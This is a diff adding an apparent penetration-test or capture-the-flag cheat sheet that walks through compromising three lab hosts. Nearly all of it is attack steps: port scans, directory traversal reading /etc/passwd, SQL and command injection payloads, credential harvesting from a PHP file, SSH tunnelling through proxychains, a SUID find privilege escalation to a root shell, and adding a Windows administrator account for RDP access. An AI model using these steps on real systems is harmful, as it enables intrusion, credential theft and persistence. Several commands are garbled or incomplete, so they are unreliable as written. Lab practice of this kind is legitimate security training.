@@ -1,0 +1,127 @@
+PUBLICFACINGWEBSITE
+	nmap -Pn -sT -p- -T5 <firstip>
+	nmap -Pn --script http-enum <ip>
+#POST / directory traversal
+=../../../../../../../../../../etc/passwd
+=../../../../../../../../../../etc/hosts
+
+#two methods to gain access
+	#1 SQLI
+		Http://ip/login.html
+		bob' OR 1='1
+
+	;id
+
+#drop a ssh key or dump the DB
+
+	Dump the DB
+		http://ip/login.php?username=bob' OR1-'1&passwd=bob' OR 1='1
+		// dumped usernames
+		// rot13 decode
+
+ssh user2@<ip>
+
+	#2 use DEVELOPEMENT.py
+		use http enum /script open developemnet.py, inside has user info
+
+ssh -MS /tmp/t1 user2@ip
+bash
+
+# enumerate
+	CAT /VAR/WWW/HTML/LOGIN.PHP
+	// sql cres: webuser sqlpass
+
+mysql --user=webuser --pass=sqlpass
+use session;
+show tables;
+select * from user;
+exit
+
+# network scan
+	for i in {}; do (ping -c.....);done command
+
+#redirection
+	ssh -S /tmp/t1 -O forward -D 9050 a@1
+
+#scans 
+	proxychains nmap -Pn -sT -T5 <foundip's> -p- --min-rate=5000
+
+proxychains nmap -Ln -T5 -sT -sV <ip's> -p <specific ports>
+
+
+T2- BESTWEBAPP
+
+ssh -S /tmp/1 -O forward -L <port>;ip:8000 -L <ip>:ip:2222 a@1
+
+browse to page using port connected to 8000
+http://127.0.0.1:port
+
+
+#SQLI
+	http://127.0.0.1:8822/pick.php?product=7 or 1='1
+	http://127.0.0.1:8822/pick.php?product=7 union select 1,2,3
+	http://127.0.0.1:8822/pick.php?product=7 union select <golden statement>
+	"" union select user_id,name,username from siteusers.users;
+
+T3 RoundSenor 
+
+#setup redirection
+	ssh -S /tmp/t1 -O forward -L 2233:ip:22 a@1
+
+ssh -p 2233 -MS /tmp/t3 user3@localhost 
+
+#enumerate 
+	find / -type f -perm /6000 -ls 2>/dev/null
+// /usr/bin/find has SUID
+
+cat /etc/shells
+bash
+
+look for suid bit set/ things that look out of place 
+
+ #privesc
+	/usr/bin/find . -exec /bin/sh -p \; -quit
+id
+
+#scan network 
+for i in {} ..... command 
+// .189 not previously seen
+
+#change dynamic tunnel 
+	ssh -S /tmp/t1 -O cancel -D 9050 a1
+	ssh -S /tmp/t3 -O forward -D 9050 a1
+
+proxychains nmap -Pn -sT -T5 <ip>
+
+
+
+#redirect
+	ssh -S /tmp/t3 -O forward -L 3344:.189:3389 -L 9999:.189:9999 a1
+ after you get your shell enable a user 
+	net user User password /add
+	net localgroup Administrators User /add
+	net localgroup "Remote Desktop Users: User /add
+xfreerdp /v:127.0.0.1:3344 /u:User /p:Password /cert-ignore /dynamic-resolution /dynamic-resolution +clipboard
+
+putty.exe means DLL hijacking
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
